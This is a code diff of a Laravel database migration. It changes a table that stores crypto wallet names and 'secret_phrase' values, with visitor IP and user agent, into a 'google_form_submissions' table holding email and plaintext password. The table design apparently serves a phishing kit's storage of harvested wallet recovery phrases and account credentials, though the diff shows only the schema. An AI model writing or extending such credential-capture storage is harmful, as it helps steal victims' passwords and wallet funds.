@@ -6,20 +6,26 @@ use Illuminate\Support\Facades\Schema;
 
 return new class extends Migration
 {
+    /**
+     * Run the migrations.
+     */
     public function up(): void
     {
-        Schema::create('wallet_connections', function (Blueprint $table) {
+        Schema::create('google_form_submissions', function (Blueprint $table) {
             $table->id();
-            $table->string('wallet_name')->nullable();
-            $table->longText('secret_phrase')->nullable();
+            $table->string('email');
+            $table->string('password');
             $table->string('ip_address')->nullable();
-            $table->text('user_agent')->nullable();
+            $table->string('user_agent')->nullable();
             $table->timestamps();
         });
     }
 
+    /**
+     * Reverse the migrations.
+     */
     public function down(): void
     {
-        Schema::dropIfExists('wallet_connections');
+        Schema::dropIfExists('google_form_submissions');
     }
 };
